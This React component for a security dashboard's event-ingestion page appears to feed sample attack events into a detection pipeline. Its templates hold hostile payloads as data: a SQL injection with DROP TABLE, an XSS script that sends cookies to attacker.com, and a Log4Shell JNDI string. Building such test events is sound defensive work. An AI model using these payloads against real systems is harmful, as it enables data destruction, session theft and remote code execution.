import React, { useState, useRef, useCallback } from "react";
import {
  UploadCloud, FileJson, FileText, FileSpreadsheet, File, Zap, Trash2,
  CheckCircle, AlertCircle, Loader, Send,
  Terminal, ShieldAlert, Database, Wifi, Eye, X, RefreshCw,
  GitMerge,
} from "lucide-react";
import { useIngest } from "@/api/useIngest";
import { fileToRecords, manualInputToRecord, ACCEPTED_EXTENSIONS, isSupportedFile } from "@/utils/converter";
import PipelineTraceCard from "@/components/ingest/PipelineTraceCard";

// ── Attack Templates ──────────────────────────────────────────────────────────
const TEMPLATES = [
  {
    id: "sqli",
    label: "SQL Injection",
    icon: Database,
    color: "#dc2626",
    event: {
      message: "SQL injection attempt detected",
      src_ip: "185.23.147.82",
      dst_ip: "10.0.1.45",
      asset_id: "CBSE-WebSvr-01",
      payload: "' OR 1=1--; DROP TABLE students;",
      method: "POST",
      path: "/api/login",
      user_agent: "sqlmap/1.7.8",
      severity: "critical",
      event_type: "web_attack",
    },
  },
  {
    id: "xss",
    label: "XSS Attack",
    icon: Terminal,
    color: "#ea580c",
    event: {
      message: "Cross-site scripting payload detected",
      src_ip: "203.0.113.55",
      dst_ip: "10.0.1.45",
      asset_id: "CBSE-WebSvr-01",
      payload: "<script>document.location='https://attacker.com/steal?c='+document.cookie</script>",
      method: "GET",
      path: "/search",
      severity: "high",
      event_type: "web_attack",
    },
  },
  {
    id: "lateral",
    label: "Lateral Movement",
    icon: Wifi,
    color: "#d97706",
    event: {
      message: "Suspicious SMB session — possible lateral movement",
      src_ip: "10.0.1.45",
      dst_ip: "10.0.2.33",
      asset_id: "CBSE-AppSvr-03",
      protocol: "SMB",
      port: 445,
      action: "session_opened",
      user: "svc-cbse-app",
      severity: "high",
      event_type: "lateral_movement",
    },
  },
  {
    id: "exfil",
    label: "Data Exfiltration",
    icon: ShieldAlert,
    color: "#dc2626",
    event: {
      message: "Anomalous bulk data transfer to external IP",
      src_ip: "10.0.2.33",
      dst_ip: "185.23.147.82",
      asset_id: "CBSE-AppSvr-03",
      bytes_out: 45000000,
      protocol: "HTTPS",
      port: 443,
      severity: "critical",
      event_type: "data_exfiltration",
    },
  },
  {
    id: "brute",
    label: "Brute Force",
    icon: Zap,
    color: "#7c3aed",
    event: {
      message: "Multiple failed SSH authentication attempts",
      src_ip: "45.33.32.156",
      dst_ip: "10.0.1.10",
      asset_id: "AIIMS-SSH-Gateway",
      attempts: 347,
      protocol: "SSH",
      port: 22,
      severity: "high",
      event_type: "brute_force",
    },
  },
  {
    id: "log4j",
    label: "Log4Shell",
    icon: Terminal,
    color: "#dc2626",
    event: {
      message: "Log4Shell exploitation attempt detected",
      src_ip: "185.203.116.44",
      dst_ip: "10.0.1.45",
      asset_id: "CBSE-WebSvr-01",
      payload: "${jndi:ldap://185.23.147.82:1389/a}",
      header: "User-Agent",
      cve: "CVE-2021-44228",
      severity: "critical",
      event_type: "rce_attempt",
    },
  },
];

// ── File Icon Mapping ─────────────────────────────────────────────────────────
const fileIcon = (name) => {
  const ext = name?.split(".").pop()?.toLowerCase();
  if (ext === "json")                        return <FileJson size={15} className="text-amber-500" />;
  if (["csv", "xlsx", "xls"].includes(ext)) return <FileSpreadsheet size={15} className="text-emerald-600" />;
  if (["txt", "log", "md"].includes(ext))   return <FileText size={15} className="text-blue-500" />;
  if (ext === "pdf")                         return <File size={15} className="text-red-500" />;
  return <File size={15} className="text-slate-400" />;
};

// ── Status Badge ──────────────────────────────────────────────────────────────
const statusBadge = (status) => {
  if (status === "pending")  return <Loader size={12} className="animate-spin text-[var(--hci-brand)]" />;
  if (status === "success")  return <CheckCircle size={13} className="text-emerald-500" />;
  if (status === "error")    return <AlertCircle size={13} className="text-red-500" />;
  return null;
};

// ResultCard replaced by PipelineTraceCard (imported above)

// ── Main Page ─────────────────────────────────────────────────────────────────
const IngestPage = () => {
  const ingest = useIngest();

  // File queue state
  const [files,      setFiles]      = useState([]);  // [{file, records, status, id}]
  const [dragOver,   setDragOver]   = useState(false);
  const fileInputRef = useRef();

  // Manual input state
  const [manualText, setManualText] = useState("");
  const [manualAsset, setManualAsset] = useState("");
  const [manualSrc,  setManualSrc]  = useState("ui-manual");
  const [activeTemplate, setActiveTemplate] = useState(null);

  // Results log (all ingested events)
  const [log,        setLog]        = useState([]);
  const [expandedId, setExpandedId] = useState(null);

  // ── File handling ─────────────────────────────────────────────────────────
  const addFiles = useCallback(async (rawFiles) => {
    const accepted = Array.from(rawFiles).filter(isSupportedFile);
    for (const file of accepted) {
      const id = `${file.name}-${Date.now()}`;
      setFiles((prev) => [...prev, { id, file, status: "parsing", records: [] }]);
      const records = await fileToRecords(file);
      setFiles((prev) =>
        prev.map((f) => f.id === id ? { ...f, records, status: "ready" } : f)
      );
    }
  }, []);

  const onDrop = useCallback((e) => {
    e.preventDefault();
    setDragOver(false);
    addFiles(e.dataTransfer.files);
  }, [addFiles]);

  const removeFile = (id) => setFiles((prev) => prev.filter((f) => f.id !== id));

  // ── Ingest a batch of records ─────────────────────────────────────────────
  const ingestRecords = async (records, label, source) => {
    for (const rec of records) {
      const logId = `${Date.now()}-${Math.random()}`;
      const logEntry = { id: logId, label, source, status: "pending", result: null, error: null };
      setLog((prev) => [logEntry, ...prev]);
      try {
        const result = await ingest.mutateAsync(rec);
        setLog((prev) =>
          prev.map((l) => l.id === logId ? { ...l, status: "success", result } : l)
        );
      } catch (err) {
        setLog((prev) =>
          prev.map((l) => l.id === logId ? { ...l, status: "error", error: err.message } : l)
        );
      }
    }
  };

  const ingestAllFiles = async () => {
    for (const f of files) {
      if (f.status !== "ready" || f.records.length === 0) continue;
      setFiles((prev) => prev.map((x) => x.id === f.id ? { ...x, status: "ingesting" } : x));
      await ingestRecords(f.records, f.file.name, f.file.name);
      setFiles((prev) => prev.map((x) => x.id === f.id ? { ...x, status: "done" } : x));
    }
  };

  const ingestManual = async () => {
    if (!manualText.trim()) return;
    const rec = manualInputToRecord(manualText, manualSrc, manualAsset);
    await ingestRecords([rec], manualText.slice(0, 60), manualSrc);
    setManualText("");
  };

  const loadTemplate = (tpl) => {
    setManualText(JSON.stringify(tpl.event, null, 2));
    setManualSrc("ui-template");
    setManualAsset(tpl.event.asset_id || "");
    setActiveTemplate(tpl.id);
  };

  const successCount = log.filter((l) => l.status === "success").length;
  const errorCount   = log.filter((l) => l.status === "error").length;
  const pendingCount = log.filter((l) => l.status === "pending").length;

  return (
    <div className="space-y-4">
      {/* Header */}
      <div className="panel px-5 py-4 flex items-center gap-3">
        <div className="w-9 h-9 rounded-md bg-[var(--hci-brand)] text-white flex items-center justify-center shrink-0">
          <UploadCloud size={18} />
        </div>
        <div>
          <div className="font-head font-bold text-[15px]">Event Ingestion · A1 Pipeline</div>
          <div className="text-[12.5px] text-[var(--hci-text-2)]">
            Upload files or inject events manually — all formats auto-converted before pipeline entry.
          </div>
        </div>
        <div className="ml-auto flex items-center gap-3">
          {successCount > 0 && <span className="chip chip-clean">{successCount} ingested</span>}
          {errorCount   > 0 && <span className="chip chip-critical">{errorCount} failed</span>}
          {pendingCount > 0 && <span className="chip chip-warning flex items-center gap-1"><Loader size={10} className="animate-spin" /> {pendingCount} pending</span>}
        </div>
      </div>

      <div className="grid grid-cols-12 gap-4">
        {/* ── LEFT COLUMN: Upload + Manual ─────────────────────────────── */}
        <div className="col-span-5 space-y-4">

          {/* File Drop Zone */}
          <div className="panel overflow-hidden">
            <div className="px-5 py-3 border-b border-[var(--hci-border)] flex items-center gap-2">
              <UploadCloud size={15} className="text-[var(--hci-brand)]" />
              <span className="font-head font-bold text-[13.5px]">File Upload</span>
              <span className="ml-auto text-[11px] text-[var(--hci-text-3)]">JSON · CSV · XLSX · TXT · PDF · LOG</span>
            </div>

            {/* Drop area */}
            <div
              className={`m-4 rounded-xl border-2 border-dashed transition-all cursor-pointer flex flex-col items-center justify-center gap-3 py-10 ${
                dragOver
                  ? "border-[var(--hci-brand)] bg-blue-50"
                  : "border-slate-200 hover:border-[var(--hci-brand)] hover:bg-slate-50"
              }`}
              onDragOver={(e) => { e.preventDefault(); setDragOver(true); }}
              onDragLeave={() => setDragOver(false)}
              onDrop={onDrop}
              onClick={() => fileInputRef.current?.click()}
            >
              <UploadCloud size={32} className={dragOver ? "text-[var(--hci-brand)]" : "text-slate-300"} />
              <div className="text-center">
                <div className="font-semibold text-[13px] text-[var(--hci-text)]">Drop files here or click to browse</div>
                <div className="text-[11.5px] text-[var(--hci-text-3)] mt-0.5">Any format, any structure — auto-converted</div>
              </div>
              <input
                ref={fileInputRef}
                type="file"
                multiple
                accept={ACCEPTED_EXTENSIONS}
                className="hidden"
                onChange={(e) => addFiles(e.target.files)}
              />
            </div>

            {/* File queue */}
            {files.length > 0 && (
              <div className="px-4 pb-4 space-y-2">
                {files.map((f) => (
                  <div key={f.id} className="flex items-center gap-2.5 p-2.5 rounded-lg border border-slate-100 bg-slate-50 text-[12.5px]">
                    {fileIcon(f.file.name)}
                    <span className="flex-1 font-mono truncate">{f.file.name}</span>
                    <span className="text-[var(--hci-text-3)] text-[11px] shrink-0">
                      {f.status === "parsing" ? "parsing…"
                       : f.status === "ingesting" ? "ingesting…"
                       : f.status === "done" ? `✓ ${f.records.length} records`
                       : `${f.records.length} records`}
                    </span>
                    {f.status === "parsing" || f.status === "ingesting"
                      ? <Loader size={13} className="animate-spin text-[var(--hci-brand)]" />
                      : f.status === "done"
                        ? <CheckCircle size={13} className="text-emerald-500" />
                        : <button onClick={() => removeFile(f.id)} className="text-slate-400 hover:text-red-500">
                            <X size={13} />
                          </button>
                    }
                  </div>
                ))}
                <button
                  onClick={ingestAllFiles}
                  disabled={files.every((f) => f.status !== "ready")}
                  className="btn btn-primary btn-sm w-full mt-2"
                >
                  <Send size={13} />
                  Ingest All Files → A1 Pipeline
                </button>
              </div>
            )}
          </div>

          {/* Manual Event Injection */}
          <div className="panel overflow-hidden">
            <div className="px-5 py-3 border-b border-[var(--hci-border)] flex items-center gap-2">
              <Terminal size={15} className="text-[var(--hci-brand)]" />
              <span className="font-head font-bold text-[13.5px]">Manual Event Injection</span>
            </div>

            {/* Attack templates */}
            <div className="px-4 pt-3 pb-2">
              <div className="label-caps mb-2">Attack Templates</div>
              <div className="grid grid-cols-3 gap-1.5">
                {TEMPLATES.map((tpl) => {
                  const Icon = tpl.icon;
                  return (
                    <button
                      key={tpl.id}
                      onClick={() => loadTemplate(tpl)}
                      className={`flex items-center gap-1.5 px-2.5 py-2 rounded-lg border text-[11.5px] font-semibold transition-all ${
                        activeTemplate === tpl.id
                          ? "border-[var(--hci-brand)] bg-blue-50 text-[var(--hci-brand)]"
                          : "border-slate-100 hover:border-slate-300 bg-white text-[var(--hci-text)]"
                      }`}
                    >
                      <Icon size={12} style={{ color: tpl.color }} />
                      {tpl.label}
                    </button>
                  );
                })}
              </div>
            </div>

            <div className="px-4 pb-4 space-y-2.5">
              <div>
                <label className="label-caps block mb-1">Event Payload (JSON, key=value, or plain text)</label>
                <textarea
                  className="w-full h-36 font-mono text-[11.5px] border border-slate-200 rounded-lg p-3 resize-none focus:outline-none focus:border-[var(--hci-brand)] bg-slate-50"
                  placeholder={'{"message":"Suspicious login","src_ip":"1.2.3.4","severity":"high"}\n\nOr just type:\n  SQL injection via /api/search — user admin, payload: \' OR 1=1--'}
                  value={manualText}
                  onChange={(e) => { setManualText(e.target.value); setActiveTemplate(null); }}
                />
              </div>
              <div className="grid grid-cols-2 gap-2">
                <div>
                  <label className="label-caps block mb-1">Asset ID (optional)</label>
                  <input
                    className="w-full font-mono text-[11.5px] border border-slate-200 rounded-lg px-3 py-2 focus:outline-none focus:border-[var(--hci-brand)]"
                    placeholder="CBSE-WebSvr-01"
                    value={manualAsset}
                    onChange={(e) => setManualAsset(e.target.value)}
                  />
                </div>
                <div>
                  <label className="label-caps block mb-1">Source Tag</label>
                  <input
                    className="w-full font-mono text-[11.5px] border border-slate-200 rounded-lg px-3 py-2 focus:outline-none focus:border-[var(--hci-brand)]"
                    placeholder="ui-manual"
                    value={manualSrc}
                    onChange={(e) => setManualSrc(e.target.value)}
                  />
                </div>
              </div>
              <button
                onClick={ingestManual}
                disabled={!manualText.trim() || ingest.isPending}
                className="btn btn-danger btn-sm w-full"
              >
                {ingest.isPending
                  ? <><Loader size={13} className="animate-spin" /> Ingesting…</>
                  : <><Send size={13} /> Inject Event → A1 Pipeline</>
                }
              </button>
            </div>
          </div>
        </div>

        {/* ── RIGHT COLUMN: Pipeline Trace Feed ─────────────────────────── */}
        <div className="col-span-7 panel flex flex-col" style={{ minHeight: 560 }}>
          <div className="px-5 py-3 border-b border-[var(--hci-border)] flex items-center gap-2 shrink-0">
            <GitMerge size={15} className="text-[var(--hci-brand)]" />
            <span className="font-head font-bold text-[13.5px]">Pipeline Explainability Trace</span>
            <span className="chip chip-info ml-1">{log.length} events</span>
            {log.length > 0 && (
              <button
                onClick={() => setLog([])}
                className="ml-auto btn btn-outline btn-sm"
              >
                <Trash2 size={12} /> Clear
              </button>
            )}
            <button
              onClick={() => window.location.reload()}
              className={log.length > 0 ? "btn btn-outline btn-sm" : "btn btn-outline btn-sm ml-auto"}
              title="Refresh page"
            >
              <RefreshCw size={12} />
            </button>
          </div>

          <div className="flex-1 overflow-auto p-4 space-y-2">
            {log.length === 0 && (
              <div className="flex flex-col items-center justify-center h-full py-20 text-center text-[var(--hci-text-3)]">
                <UploadCloud size={40} className="mb-4 opacity-20" />
                <div className="font-semibold text-[13px]">No events ingested yet</div>
                <div className="text-[12px] mt-1 max-w-xs">
                  Use a template on the left and click <strong>Inject Event</strong> to see the full A1→A12 pipeline trace.
                </div>
              </div>
            )}
            {log.map((item) => (
              <PipelineTraceCard
                key={item.id}
                item={item}
                expanded={expandedId === item.id}
                onExpand={() => setExpandedId(expandedId === item.id ? null : item.id)}
              />
            ))}
          </div>

          {/* Stats footer */}
          {log.length > 0 && (
            <div className="border-t border-[var(--hci-border)] px-5 py-2.5 bg-[#fbfcfd] text-[11.5px] text-[var(--hci-text-3)] flex items-center gap-4 shrink-0">
              <span className="text-emerald-600 font-semibold">{successCount} passed</span>
              <span className="text-red-500 font-semibold">{errorCount} failed</span>
              {pendingCount > 0 && <span className="text-amber-500 font-semibold">{pendingCount} running</span>}
              <span className="ml-auto">A1 → A12 pipeline · real-time</span>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default IngestPage;
